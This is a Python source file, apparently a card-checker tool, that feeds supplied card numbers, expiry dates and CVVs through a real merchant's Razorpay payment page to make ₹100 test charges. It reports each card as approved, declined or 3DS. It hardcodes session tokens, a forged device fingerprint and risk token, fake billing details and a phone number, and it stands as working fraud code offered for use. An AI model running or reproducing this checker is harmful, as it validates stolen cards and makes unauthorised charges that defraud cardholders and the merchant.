import time
import random
import requests
from utils.helpers import random_hex

async def razorpay_check(card, month, year, cvv):
    try:
        session = requests.Session()
        KEY_ID = "rzp_live_T1qlctbJRtHxhL"
        SESSION_TOKEN = "B00EC195C8A1A5509FF105D4840A299626B18E2F71D22165981A5265F5512CF2A0431640385AE22F4E3940E22C83B1ED766BAFEDBF45CE2172AF62DB8F9AFB6FD02428878357228743CB005F4AF6E92887EF53A9F7008754289E37026428E1C5C9D293E37B300159"
        KEYLESS_HEADER = "api_v1%3AwaVXKuSoQNd3q0C8gnJNo%2BFQQAGuoxXg34FNrVQRiStweDR61DHPRH%2BDmLSCv7zj23Nn7Tpg2qQjxK%2FELdgkmRNfTrgAJw%3D%3D"
        VPA = "9023510377"
        # Order
        order_resp = session.post('https://api.razorpay.com/v1/payment_pages/pl_OqYzfw0fykO01F/order',
                                  headers={'Content-Type': 'application/json', 'Origin': 'https://razorpay.me', 'Referer': 'https://razorpay.me/'},
                                  json={"notes": {"comment": ""}, "line_items": [{"payment_page_item_id": "ppi_OqYzfxzDW3KJxZ", "amount": 100}]})
        if order_resp.status_code != 200:
            return ("❌ ERROR", "Order creation failed", None)
        order_json = order_resp.json()
        order_id = order_json.get('id')
        checkout_id = order_json.get('line_items', [{}])[0].get('id')
        if not order_id or not checkout_id:
            return ("❌ ERROR", "Missing order/checkout id", None)
        # VPA validation
        vpa_data = {"entity": "vpa", "value": VPA, "_[library]": "checkoutjs"}
        vpa_headers = {'Content-type': 'application/x-www-form-urlencoded', 'x-session-token': SESSION_TOKEN,
                       'Cookie': 'user_fingerprint_v2=df3b0f0879e7309fd1df2d4902f088a3b064ce9a048fe8de7a54ce03512f9fa5; testcookie=1'}
        vpa_resp = session.post(f'https://api.razorpay.com/v1/standard_checkout/payments/validate/account?key_id={KEY_ID}&session_token={SESSION_TOKEN}&keyless_header={KEYLESS_HEADER}',
                                data=vpa_data, headers=vpa_headers)
        if vpa_resp.status_code != 200:
            return ("❌ ERROR", "VPA validation failed", None)
        vpa_json = vpa_resp.json()
        vpa_token = vpa_json.get('vpa_token')
        if not vpa_token:
            return ("❌ ERROR", "No vpa token", None)
        # Payment
        device_id = f"1.7c1caf29fb658b393da7a3f13a3ef1e2ac459df5.1781928244567.{random.randint(10000000,99999999)}"
        shield_fhash = "d9a51addd9d0247b1aaf8457e2d4359cfe706632"
        user_risk_token = 'W3sibmFtZSI6InNhcmRpbmUiLCJtZXRhZGF0YSI6eyJzZXNzaW9uX2lkIjoiVDQ4UXFxaTFIeWUzM04ifX1d'
        payment_data = {
            "notes[comment]": "", "payment_link_id": "pl_OqYzfw0fykO01F", "key_id": KEY_ID,
            "contact": "+919023510377", "email": "abc@gmail.com", "currency": "INR",
            "_[checkout_id]": checkout_id, "_[device.id]": device_id, "_[library]": "checkoutjs",
            "_[library_src]": "no-src", "_[current_script_src]": "no-src", "_[platform]": "browser",
            "_[env]": "", "_[is_magic_script]": "false", "_[os]": "android",
            "_[referer]": "https://razorpay.me/@mstechnomedia", "_[shield][fhash]": shield_fhash,
            "_[shield][tz]": "330", "_[device_id]": device_id, "_[build]": "27697546038",
            "_[request_index]": "0", "amount": "100", "order_id": order_id,
            "user_risk_providers_token": user_risk_token, "method": "card",
            "card[number]": card, "card[cvv]": cvv, "card[name]": "64kbitters",
            "card[expiry_month]": month, "card[expiry_year]": year, "save": "0",
            "billing_address[country]": "IN", "billing_address[postal_code]": "360001",
            "billing_address[city]": "Rajkot", "billing_address[state]": "Gujarat",
            "billing_address[line1]": "Na", "billing_address[line2]": "Na",
            "currency_request_id": checkout_id, "dcc_currency": "AZN", "_[shield_context]": ""
        }
        pay_headers = {'Content-type': 'application/x-www-form-urlencoded', 'x-session-token': SESSION_TOKEN,
                       'Cookie': 'user_fingerprint_v2=df3b0f0879e7309fd1df2d4902f088a3b064ce9a048fe8de7a54ce03512f9fa5; testcookie=1'}
        pay_resp = session.post(f'https://api.razorpay.com/v1/standard_checkout/payments/create/ajax?key_id={KEY_ID}&session_token={SESSION_TOKEN}&keyless_header={KEYLESS_HEADER}',
                                data=payment_data, headers=pay_headers)
        if pay_resp.status_code != 200:
            return ("❌ ERROR", f"Payment error: {pay_resp.status_code}", None)
        text = pay_resp.text
        if 'error' in text and 'SERVER_ERROR' in text:
            return ("❌ DECLINED", "Card Declined", False)
        if '3ds' in text.lower() or 'authentication' in text.lower():
            return ("🔒 3DS", "3DS Required", None)
        if 'success' in text.lower() and 'true' in text.lower():
            return ("✅ APPROVED", "Charged ₹100", True)
        return ("⚠️ UNKNOWN", text[:100], None)
    except Exception as e:
        return ("❌ ERROR", str(e)[:100], None)